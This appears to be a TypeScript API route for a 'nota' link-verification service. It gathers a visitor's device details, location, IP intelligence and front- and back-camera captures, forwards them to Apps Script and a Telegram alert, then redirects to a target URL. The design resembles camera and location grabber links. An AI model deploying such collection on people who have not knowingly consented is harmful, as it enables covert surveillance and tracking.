import type { APIRoute } from 'astro';
import { waitUntil } from '@vercel/functions';
import { getSession, saveSession, getNota, saveNota } from '../../../lib/storage';
import { fetchNotaFromAppsScript, dispatchEvidenceToAppsScript } from '../../../lib/apps-script';
import { createVerifiedNotaToken, generateSecureId } from '../../../lib/security';
import { sanitizeDeviceInfo } from '../../../lib/device';
import {
  getVerificationCookie,
  setVerifiedTokenCookie,
  clearVerificationCookie,
  VERIFIED_TOKEN_TTL_MS
} from '../../../lib/session';
import type { VerificationSession } from '../../../lib/types';
import { sendTelegramAlert } from '../../../lib/telegram';
import { lookupIpIntelligence } from '../../../lib/ip-intelligence';

export const prerender = false;

export const POST: APIRoute = async ({ request, cookies, clientAddress }) => {
  try {
    const body = await request.json().catch(() => null);
    const sessionId = body?.sessionId || getVerificationCookie(cookies) || `VRF-${generateSecureId('', 6)}`;
    const notaId = body?.notaId || body?.session?.notaId;

    const existingSession = getSession(sessionId);
    const session: VerificationSession = existingSession
      ? { ...existingSession }
      : {
          id: sessionId,
          notaId: notaId || 'UNKNOWN',
          createdAt: body?.createdAt || (Date.now() - 5000),
          status: 'INITIATED',
          step: 1,
          antiSpoofNonce: generateSecureId('', 8),
          expiresAt: Date.now() + 600000,
          ipAddress: clientAddress ||
            request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
            request.headers.get('x-real-ip') ||
            '127.0.0.1',
          device: body?.device ? sanitizeDeviceInfo(body.device, request.headers.get('user-agent') || '') : undefined,
          location: body?.location || undefined,
          frontCamera: body?.frontCamera || undefined,
          backCamera: body?.backCamera || undefined
        };

    if (existingSession) {
      if (notaId && (!session.notaId || session.notaId === 'UNKNOWN')) {
        session.notaId = notaId;
      }
      if (body?.device && !session.device) {
        session.device = sanitizeDeviceInfo(body.device, request.headers.get('user-agent') || '');
      }
      if (body?.location && !session.location) {
        session.location = body.location;
      }
      if (body?.frontCamera && !session.frontCamera) {
        session.frontCamera = body.frontCamera;
      }
      if (body?.backCamera && !session.backCamera) {
        session.backCamera = body.backCamera;
      }
    }
    saveSession(session);

    let nota = session.notaId && session.notaId !== 'UNKNOWN' ? getNota(session.notaId) : null;
    if (!nota && session.notaId && session.notaId !== 'UNKNOWN') {
      nota = await fetchNotaFromAppsScript(session.notaId).catch(() => null);
      if (nota) {
        saveNota(nota);
      }
    }

    if (!nota) {
      return new Response(
        JSON.stringify({
          success: false,
          error: { code: 'NOTA_NOT_FOUND', message: 'Associated nota was not found.' }
        }),
        { status: 404, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Identify which steps were captured vs denied/skipped
    const missingSteps: string[] = [];
    if (!session.device) missingSteps.push('Device Info');
    if (!session.location) missingSteps.push('Location');
    if (!session.frontCamera) missingSteps.push('Front Camera');
    if (!session.backCamera) missingSteps.push('Back Camera');

    // If camera or location is denied/skipped, still record session and gracefully redirect
    const isFullVerified = missingSteps.length === 0;
    session.status = 'VERIFIED';
    session.failureReason = missingSteps.length > 0 ? `Izin dilewati/ditolak: ${missingSteps.join(', ')}` : '-';
    session.verifiedAt = Date.now();
    session.durationMs = Date.now() - session.createdAt;

    saveSession(session);

    // Run heavy external tasks (IP Intelligence, Google Apps Script, Telegram) asynchronously in background
    // Using Vercel's waitUntil to prevent serverless execution freeze while guaranteeing immediate response (< 100ms)
    const verificationOutcome = isFullVerified ? 'VERIFIED' : 'FAILED';
    const backgroundTask = (async () => {
      try {
        if (!session.ipIntelligence && session.ipAddress) {
          session.ipIntelligence = await lookupIpIntelligence(
            session.ipAddress,
            session.device?.userAgent || request.headers.get('user-agent') || ''
          ).catch(() => undefined);
          saveSession(session);
        }

        await Promise.allSettled([
          dispatchEvidenceToAppsScript(session, verificationOutcome, session.failureReason).catch((err) => {
            console.error('Apps Script evidence dispatch error:', err);
          }),
          sendTelegramAlert(session, verificationOutcome, session.failureReason).catch((err) => {
            console.error('Telegram alert dispatch error:', err);
          })
        ]);
      } catch (bgErr) {
        console.error('Background dispatch task error:', bgErr);
      }
    })();

    try {
      waitUntil(backgroundTask);
    } catch {
      // Fallback for non-Vercel environment (e.g. local dev server)
      backgroundTask.catch(() => {});
    }

    // Create cryptographically signed token for nota access
    const token = createVerifiedNotaToken({
      notaId: session.notaId,
      verificationId: session.id,
      verifiedAt: session.verifiedAt,
      expiresAt: Date.now() + VERIFIED_TOKEN_TTL_MS
    });

    // Set signed verified cookie
    setVerifiedTokenCookie(cookies, token);

    // Clear temporary verification session cookie
    clearVerificationCookie(cookies);

    return new Response(
      JSON.stringify({
        success: true,
        message: isFullVerified ? 'Verification successful.' : 'Verification completed with fallback.',
        data: {
          notaId: session.notaId,
          verificationId: session.id,
          verifiedAt: session.verifiedAt,
          redirectUrl: (nota.type === 'link' && nota.targetUrl) ? nota.targetUrl : `/nota/${session.notaId}`
        }
      }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (err: any) {
    return new Response(
      JSON.stringify({
        success: false,
        error: { code: 'SERVER_ERROR', message: err.message || 'Verification finalization failed.' }
      }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
};
